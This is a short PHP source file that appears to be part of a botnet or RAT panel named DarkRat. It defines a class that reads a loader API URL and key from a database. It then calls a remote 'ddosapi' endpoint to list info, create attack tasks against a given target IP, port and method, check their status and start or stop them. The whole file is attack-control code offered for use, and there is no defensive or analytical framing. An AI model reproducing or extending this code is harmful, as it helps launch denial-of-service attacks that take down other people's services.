<?php

class DarkRatAPI{

    static public function info(){
        $sql = "SELECT * FROM loader_api WHERE id = 1";
        $loader_api = $GLOBALS["pdo"]->query($sql)->fetch();

        return file_get_contents( $loader_api["api_url"]."/ddosapi/v1?apikey=". $loader_api["api_key"]."&handle=apiinfo");
    }

    static public function getTaskInfo($id){
        $sql = "SELECT * FROM loader_api WHERE id = 1";
        $loader_api = $GLOBALS["pdo"]->query($sql)->fetch();
        return file_get_contents($loader_api["api_url"]."/ddosapi/v1?apikey=". $loader_api["api_key"]."&handle=status&id=".$id);
    }

    static public function createTask($time,$port,$host,$method){
        $sql = "SELECT * FROM loader_api WHERE id = 1";
        $loader_api = $GLOBALS["pdo"]->query($sql)->fetch();
      return file_get_contents($loader_api["api_url"]."/ddosapi/v1?apikey=". $loader_api["api_key"]."&handle=attack&maxtime=".$time."&port=".$port."&method=".$method."&targetip=".$host);
    }

    static public function startStopTask($id){
        $sql = "SELECT * FROM loader_api WHERE id = 1";
        $loader_api = $GLOBALS["pdo"]->query($sql)->fetch();
        return file_get_contents($loader_api["api_url"]."/ddosapi/v1?apikey=". $loader_api["api_key"]."&handle=startstop&id=".$id);
    }
}